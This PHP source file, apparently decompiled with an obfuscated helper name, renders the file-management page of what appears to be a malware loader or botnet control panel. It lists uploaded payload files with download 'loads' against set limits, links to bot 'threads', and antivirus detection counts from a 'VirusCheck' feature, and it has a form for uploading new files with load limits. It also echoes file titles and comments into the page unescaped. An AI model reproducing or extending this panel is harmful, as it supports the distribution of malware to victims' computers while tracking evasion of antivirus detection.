<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "files");
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
list($files) = Browser2::getalldata(array( "files" ));
$months = array( "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" );
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n\t<title>";
echo Lang::get("MenuFilesButton");
echo "</title>\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\n\t<link rel=\"stylesheet\" href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=css&file=main.css\" type=\"text/css\" media=\"screen\" />\n</head>\n<body>\n\t<div class=\"title\">\n\t\t<ul>\n\t\t\t<li class=\"logo\"><a href=\"";
echo Config::get("AdminScriptName");
echo "\"><img src=\"";
echo $imgPath;
echo "logo.gif\" width=\"15px\" height=\"15px\"/></a></li>\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "\">";
echo Lang::get("MenuMainButton");
echo "</a></li>\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=threads\">";
echo Lang::get("MenuThreadsButton");
echo "</a></li>\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=secur\">";
echo Lang::get("MenuSecurityButton");
echo "</a></li>\n\t\t</ul>\n\t\t<div class=\"controls\">\n\t\t\t<ul>\n\t\t\t\t<li class=\"edit\"><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=prefs\"><img src=\"";
echo $imgPath;
echo "edit.gif\" width=\"7px\" height=\"7px\"/></a></li>\n\t\t\t\t<li class=\"logout\"><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=logout\"><img src=\"";
echo $imgPath;
echo "logout.gif\" width=\"6px\" height=\"10px\"/></a></li>\n\t\t\t</ul>\n\t\t</div>\n\t\t<div style=\"clear:both;\"></div>\n\t</div>\n\t\n\t<div class=\"files\">\n\t\t<div class=\"files_title\">";
echo Lang::get("FilesList");
echo "</div>\n\t\t";
foreach( $files as $k => $file ) 
{
    $limit = $file["FileLimit"];
    $title = $file["Title"];
    $id = $file["ID"];
    $curLimit = Threads::findfile($id);
    if( $limit == 0 - 1 ) 
    {
        $curLimit = abs($curLimit) - 1;
    }

    $selThreads = array( array( "Limit" => $limit, "CurLimit" => $curLimit ) );
    echo "\t\t\t<div class=\"files_file";
    if( $k % 2 ) 
    {
        echo " odd";
    }

    if( $k == 0 ) 
    {
        echo " first";
    }

    echo "\">\n\t\t\t\t<div class=\"file_head\">\n\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
    echo Config::get("AdminScriptName");
    echo "?";
    echo Config::get("MainParamName");
    echo "=deleteFile&fileID=";
    echo $id;
    echo "\"><img src=\"";
    echo $imgPath;
    echo "close.gif\" width=\"11px\" height=\"11px\"/></a></div>\n\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
    echo Config::get("AdminScriptName");
    echo "?";
    echo Config::get("MainParamName");
    echo "=addFile&fileID=";
    echo $id;
    echo "\"><img src=\"";
    echo $imgPath;
    echo "edit2.gif\" width=\"11px\" height=\"11px\"/></a></div>\n\t\t\t\t\t<b>";
    echo $title;
    echo "</b>\n\t\t\t\t\t<br/>\n\t\t\t\t\t<span>";
    echo $file["Comment"];
    echo "</span>\n\t\t\t\t</div>\n\t\t\t\t<div>\n\t\t\t\t\t";
    foreach( $selThreads as $arr ) 
    {
        echo "\t\t\t\t\t\t<div class=\"threadStat\">";
        echo Lang::get("Loads");
        echo ":</div> <b>";
        echo number_format(($arr["Limit"] != 0 - 1 ? $arr["Limit"] - $arr["CurLimit"] : $arr["CurLimit"]), 0, "", " ");
        echo "</b> ";
        echo Lang::get("From");
        echo " <b>";
        if( $arr["Limit"] != 0 - 1 ) 
        {
            echo number_format($arr["Limit"], 0, "", " ");
        }
        else
        {
            echo "&#8734;";
        }

        echo "</b>\n\t\t\t\t\t\t<div style=\"clear:both;padding:0px;\"></div>\n\t\t\t\t\t";
    }
    echo "\t\t\t\t\t<div class=\"threadStat\">";
    echo Lang::get("Date");
    echo ":</div> ";
    echo date("j ", $file["Date"]) . $months[date("m", $file["Date"]) - 1] . date(" Y", $file["Date"]);
    echo "\t\t\t\t\t<div style=\"clear:both;padding:0px;\"></div>\n\t\t\t\t\t<div class=\"threadStat\">";
    echo Lang::get("Size");
    echo ":</div> ";
    echo _obfuscated_0D092607073D191D013123143C241125381A1F37060B11_(filesize(Config::get("FilesDir") . "/" . Threads::findfilename($file["ID"], $file["Title"])));
    echo "\t\t\t\t\t<div style=\"clear:both;padding:0px;\"></div>\n\t\t\t\t\t<div class=\"threadStat\"><a style=\"color:#004ede;text-transform:none;\" href=\"";
    echo Config::get("AdminScriptName");
    echo "?";
    echo Config::get("MainParamName");
    echo "=fileScan&fileID=";
    echo $id;
    echo "\">";
    echo Lang::get("VirusCheck");
    echo "</a></div> <b>";
    echo $file["ScanResult"];
    echo "/";
    echo $file["ScanCount"];
    echo "</b>\n\t\t\t\t\t<div style=\"clear:both;padding:0px;\"></div>\n\t\t\t\t\t<div class=\"threadStat\" style=\"text-transform:none;\">";
    if( $file["LastCheck"] != 0 ) 
    {
        echo "<a style=\"color:#004ede;text-transform:none;\" href=\"";
        echo Config::get("AdminScriptName");
        echo "?";
        echo Config::get("MainParamName");
        echo "=showLast&fileID=";
        echo $id;
        echo "\">";
    }

    echo "\t\t\t\t\t";
    echo Lang::get("LastCheck");
    if( $file["LastCheck"] != 0 ) 
    {
        echo "</a>";
    }

    echo ":</div> ";
    if( $file["LastCheck"] == 0 ) 
    {
        echo "\t\t\t\t\t\tnever\n\t\t\t\t\t";
    }
    else
    {
        echo "\t\t\t\t\t\t";
        echo date("j ", $file["LastCheck"]) . $months[date("m", $file["LastCheck"]) - 1] . date(" Y", $file["LastCheck"]);
        echo "\t\t\t\t\t";
    }

    echo "\t\t\t\t\t<div style=\"clear:both;\"></div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t";
}
echo "\t\t<div class=\"files_title\">";
echo Lang::get("SelectFile");
echo "</div>\n\t\t<form action=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=fileUpload\" method=\"post\" enctype=\"multipart/form-data\">\n\t\t\t<div style=\"padding:5px;\">\n\t\t\t\t<span>";
echo Lang::get("UploadFile");
echo ":</span>\n\t\t\t\t<input type=\"file\" name=\"file\" id=\"File\"/>\n\t\t\t\t<span>";
echo Lang::get("LoadsLimit");
echo ":</span>\n\t\t\t\t<br/>\n\t\t\t\t<input type=\"text\" class=\"text\" id=\"Limit\" name=\"Limit\" value=\"\" style=\"width:100%;\"/>\n\t\t\t\t<br/>\n\t\t\t\t<span>";
echo Lang::get("DefComment");
echo ":</span>\n\t\t\t\t<br/>\n\t\t\t\t<input type=\"text\" class=\"text\" id=\"Limit\" name=\"FileComment\" value=\"\" style=\"width:100%;\"/>\n\t\t\t\t<center><input type=\"submit\" class=\"filesubmit\" value=\"";
echo Lang::get("UploadFile");
echo "\" style=\"margin-top:10px;\"/></center>\n\t\t\t</div>\n\t\t</form>\n\t</div>\n\n</body>\n</html>";

